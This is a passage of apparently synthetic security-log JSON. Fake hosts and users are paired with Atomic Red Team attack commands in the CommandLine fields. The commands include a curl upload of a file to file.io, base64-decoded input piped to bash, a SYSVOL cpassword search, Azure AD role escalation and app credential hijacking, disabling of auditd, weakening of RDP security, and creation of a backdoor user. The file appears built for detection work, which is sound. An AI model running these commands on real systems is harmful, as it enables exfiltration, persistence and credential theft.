        "EventType": "File Create",
        "ComputerName": "desktop-41.barnes.biz",
        "User": "brian82",
        "ProcessID": 7053,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\vbsstartup.vbs\\\" \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\\"\\nCopy-Item \\\"$PathToAtomicsFolder\\\\T1547.001\\\\src\\\\vbsstartup.vbs\\\" \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\\"\\ncscript.exe \\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\vbsstartup.vbs\\\"\\ncscript.exe \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\vbsstartup.vbs\\\"\\n\",",
        "LogonID": 173713,
        "LogonGuid": "16ba5016-3306-4c75-8622-d9915c6f75eb",
        "SourceProcessID": 2593,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\current..exe",
        "DestinationProcessID": 7358,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\later..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-67.lee-blair.org",
        "User": "michael33",
        "ProcessID": 4152,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\\n\",",
        "LogonID": 469252,
        "LogonGuid": "59e91e97-bc4e-4305-8080-e70e27973a77",
        "SourceProcessID": 1815,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\simple..dll",
        "DestinationProcessID": 3308,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\plan..dll",
        "UtcTime": "2024-05-17T01:36:51.684740Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-95.howard-james.org",
        "User": "amandacohen",
        "ProcessID": 8083,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential\\n\\n$sp = Get-AzureADServicePrincipal -Filter \\\"DisplayName eq '#{service_principal_name}'\\\"\\nif ($sp -eq $null) { Write-Warning \\\"Service Principal not found\\\"; exit }\\n$role = Get-AzureADDirectoryRole -Filter \\\"DisplayName eq '#{role_name}'\\\"\\nif ($role -eq $null) { Write-Warning \\\"Role not found\\\"; exit }\\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\\nWrite-Host \\\"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\\\"\\n\",",
        "LogonID": 136083,
        "LogonGuid": "afd04ae6-4bbe-4817-bb1d-177772f8cb10",
        "SourceProcessID": 9129,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\manage..dll",
        "DestinationProcessID": 6848,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\protect..dll",
        "UtcTime": "2024-05-17T01:36:51.686247Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-12.green-miller.com",
        "User": "andrewparker",
        "ProcessID": 1776,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$buffer = New-Object byte[] 11\\n$handle = New-Object IO.FileStream \\\"\\\\\\\\.\\\\#{volume}\\\", 'Open', 'Read', 'ReadWrite'\\n$handle.Read($buffer, 0, $buffer.Length)\\n$handle.Close()\\nFormat-Hex -InputObject $buffer\\n\",",
        "LogonID": 703724,
        "LogonGuid": "7e49ddb9-3f3f-4401-b1d2-3133369ec044",
        "SourceProcessID": 7032,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\federal..dll",
        "DestinationProcessID": 4188,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\news..dll",
        "UtcTime": "2024-05-17T01:36:51.686247Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-14.rice.com",
        "User": "wilsonlevi",
        "ProcessID": 2320,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"[ \\\"$(uname)\\\" = 'FreeBSD' ] && encodecmd=\\\"b64encode -r -\\\" && decodecmd=\\\"b64decode -r\\\" || encodecmd=\\\"base64 -w 0\\\" && decodecmd=\\\"base64 -d\\\"\\nART=$(echo -n \\\"id\\\" | $encodecmd)\\necho \\\"\\\\$ART=$ART\\\"\\necho -n \\\"$ART\\\" | $decodecmd |/bin/bash\\nunset ART\\n\",",
        "LogonID": 491440,
        "LogonGuid": "3e5afc04-bcab-4ef6-8fcd-4e23a93a9266",
        "SourceProcessID": 1445,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\strategy..exe",
        "DestinationProcessID": 5979,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\event..dll",
        "UtcTime": "2024-05-17T01:36:51.686247Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-10.mcdaniel-benson.info",
        "User": "mikewright",
        "ProcessID": 2459,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg query \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\International\\\\Geo\\\"\\n\",",
        "LogonID": 330617,
        "LogonGuid": "750de2b5-dd1a-4475-895e-ef1d9c33d49a",
        "SourceProcessID": 9488,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\fear..dll",
        "DestinationProcessID": 6087,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\answer..dll",
        "UtcTime": "2024-05-17T01:36:51.686247Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-32.foster-ford.biz",
        "User": "drakekarina",
        "ProcessID": 3119,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"findstr /S cpassword %logonserver%\\\\sysvol\\\\*.xml\\n\",",
        "LogonID": 436493,
        "LogonGuid": "a991ff69-ecc2-48e4-8616-29a31a27ce5f",
        "SourceProcessID": 2828,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\baby..dll",
        "DestinationProcessID": 2177,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\then..dll",
        "UtcTime": "2024-05-17T01:36:51.687257Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-42.bradley.com",
        "User": "paulmartinez",
        "ProcessID": 2093,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\\n\",",
        "LogonID": 704468,
        "LogonGuid": "b55dbd70-fa49-4916-b74a-a4ce32651ba9",
        "SourceProcessID": 4019,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\it..dll",
        "DestinationProcessID": 8885,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\know..exe",
        "UtcTime": "2024-05-17T01:36:51.687257Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-91.johnson.com",
        "User": "teresa36",
        "ProcessID": 1914,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo \\\"# THIS IS A COMMENT\\\" >> /etc/default/ufw\\ngrep \\\"# THIS IS A COMMENT\\\" /etc/default/ufw\\n\",",
        "LogonID": 923990,
        "LogonGuid": "f03ec410-0dd1-447f-b311-2f93376c56b8",
        "SourceProcessID": 7163,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\hope..dll",
        "DestinationProcessID": 3505,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\spend..exe",
        "UtcTime": "2024-05-17T01:36:51.687257Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-01.parker.net",
        "User": "phillip79",
        "ProcessID": 9656,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Import-Module -Name AzureAD\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzureAD -Credential $Credential > $null\\n\\n$app = Get-AzureADApplication -SearchString \\\"#{application_name}\\\" | Select-Object -First 1\\nif ($app -eq $null) { Write-Warning \\\"Application not found\\\"; exit }\\n\\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\\n$credNotAfter = (Get-Date).AddDays(1)\\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\\n\\n$cert = New-SelfSignedCertificate -DnsName \\\"atomicredteam.example.com\\\" -FriendlyName \\\"AtomicCert\\\" -CertStoreLocation Cert:\\\\CurrentUser\\\\My -KeyExportPolicy Exportable -Provider \\\"Microsoft Enhanced RSA and AES Cryptographic Provider\\\" -NotAfter $certNotAfter\\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\\nWrite-Host \\\"Generated certificate \\\"\\\"$($cert.Thumbprint)\\\"\\\"\\\"\\n\\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \\\"AtomicTest\\\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\\n\\nStart-Sleep -s 30\\n$tenant = Get-AzureADTenantDetail\\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\\nWrite-Host \\\"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\\\"\\nWrite-Host \\\"End of Hijacking\\\"\\n\",",
        "LogonID": 967675,
        "LogonGuid": "2fce6ae6-e936-4d5d-8c68-666b8206eec3",
        "SourceProcessID": 9645,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\resource..exe",
        "DestinationProcessID": 9828,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\our..exe",
        "UtcTime": "2024-05-17T01:36:51.687257Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-95.lang.com",
        "User": "fmiller",
        "ProcessID": 8301,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"password=$(openssl passwd -1 art)\\n([ \\\"$(uname)\\\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))\\nsu art -c \\\"whoami; exit\\\"\\n\",",
        "LogonID": 963570,
        "LogonGuid": "217d5bf9-f764-4505-ba20-a4a338d1f192",
        "SourceProcessID": 6570,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\state..exe",
        "DestinationProcessID": 5561,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\kind..dll",
        "UtcTime": "2024-05-17T01:36:51.687257Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-73.thompson-aguilar.net",
        "User": "xbryant",
        "ProcessID": 9820,
        "ProcessName": "malware.exe",
        "CommandLine": "\"kubectl get secrets --all-namespaces\\n\",",
        "LogonID": 713313,
        "LogonGuid": "a17a4426-0e6b-49d2-8615-31d260db1df9",
        "SourceProcessID": 1547,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\trip..exe",
        "DestinationProcessID": 8214,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\lot..exe",
        "UtcTime": "2024-05-17T01:36:51.688256Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-95.coleman.com",
        "User": "ortizjamie",
        "ProcessID": 7562,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Start-Process \\\"#{Splashtop_Path}\\\"\\n\",",
        "LogonID": 341920,
        "LogonGuid": "1fe6218a-8aab-4e0c-b400-10c3a1de16e7",
        "SourceProcessID": 1720,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\recognize..dll",
        "DestinationProcessID": 7239,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\soon..dll",
        "UtcTime": "2024-05-17T01:36:51.688256Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-99.brown.org",
        "User": "james85",
        "ProcessID": 3893,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"$oldvalue = $(Get-ItemProperty HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\\nSet-ItemProperty -Path \\\"HKLM:\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\" -Name 'Security Packages old' -Value \\\"$oldvalue\\\";\\n$newvalue = \\\"AtomicTest.dll\\\";\\nSet-ItemProperty HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa -Name 'Security Packages' -Value $newvalue\\n\",",
        "LogonID": 378155,
        "LogonGuid": "03d828c0-ef46-4a2a-a5fb-2e7568b0a425",
        "SourceProcessID": 9890,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\continue..dll",
        "DestinationProcessID": 1468,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\again..exe",
        "UtcTime": "2024-05-17T01:36:51.688256Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-97.sheppard.com",
        "User": "melissa14",
        "ProcessID": 5288,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"md #{folder_name}\\necho too many secrets > #{folder_name}\\\\#{hidden_filename}\\n\",",
        "LogonID": 803816,
        "LogonGuid": "a9c8d1b2-123b-4d9a-8321-dd86e7cede45",
        "SourceProcessID": 2754,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\industry..dll",
        "DestinationProcessID": 4266,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\hundred..dll",
        "UtcTime": "2024-05-17T01:36:51.689258Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-98.barker.org",
        "User": "joshua34",
        "ProcessID": 9495,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"\\\"#{uacme_exe}\\\"\\n\",",
        "LogonID": 318633,
        "LogonGuid": "ff1d2454-b9ab-43be-926f-0065bfbf7b7b",
        "SourceProcessID": 9741,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\participant..exe",
        "DestinationProcessID": 1838,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\can..exe",
        "UtcTime": "2024-05-17T01:36:51.689258Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-10.andrade-herring.com",
        "User": "gomezteresa",
        "ProcessID": 1371,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"auditctl -e 0\\n\",",
        "LogonID": 373752,
        "LogonGuid": "18377a1a-38d6-456e-86fd-aed3d45d0f37",
        "SourceProcessID": 5113,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\food..exe",
        "DestinationProcessID": 5975,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\natural..dll",
        "UtcTime": "2024-05-17T01:36:51.689258Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-84.burke-ryan.biz",
        "User": "ohines",
        "ProcessID": 7668,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"hklm\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\Winstations\\\\RDP-Tcp\\\" /v SecurityLayer /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 613867,
        "LogonGuid": "5b4a1210-fa4d-4a2a-8fd3-98054562744e",
        "SourceProcessID": 3367,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\direction..dll",
        "DestinationProcessID": 6009,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\pay..exe",
        "UtcTime": "2024-05-17T01:36:51.689258Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-21.barnes.com",
        "User": "jessicabeck",
        "ProcessID": 1921,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"wget --post-data=\\\"msg=AtomicTestT1048.002\\\" --timeout=5 --no-check-certificate https://example.com/ --delete-after\\n\",",
        "LogonID": 159829,
        "LogonGuid": "1c1dfb66-7600-413e-9ce1-99a05d5b5c73",
        "SourceProcessID": 4092,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\explain..dll",
        "DestinationProcessID": 6335,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\price..dll",
        "UtcTime": "2024-05-17T01:36:51.689258Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-92.white.org",
        "User": "amber51",
        "ProcessID": 1286,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"md #{folder_name}\\necho too many secrets > #{folder_name}\\\\#{hidden_filename}\\n\",",
        "LogonID": 691991,
        "LogonGuid": "788697f6-1f7c-4971-bbd2-3e58014440c7",
        "SourceProcessID": 8927,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\without..dll",
        "DestinationProcessID": 2321,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\subject..dll",
        "UtcTime": "2024-05-17T01:36:51.690257Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-72.sullivan.org",
        "User": "ashleyavila",
        "ProcessID": 4763,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sc query type=service > %TEMP%\\\\T1119_1.txt\\ndoskey /history > %TEMP%\\\\T1119_2.txt\\nwmic process list > %TEMP%\\\\T1119_3.txt\\ntree C:\\\\AtomicRedTeam\\\\atomics > %TEMP%\\\\T1119_4.txt\\n\",",
        "LogonID": 389238,
        "LogonGuid": "d883508d-ad68-4766-b020-5ea964c727c1",
        "SourceProcessID": 8684,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\minute..dll",
        "DestinationProcessID": 7575,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\owner..dll",
        "UtcTime": "2024-05-17T01:36:51.690257Z"
    },
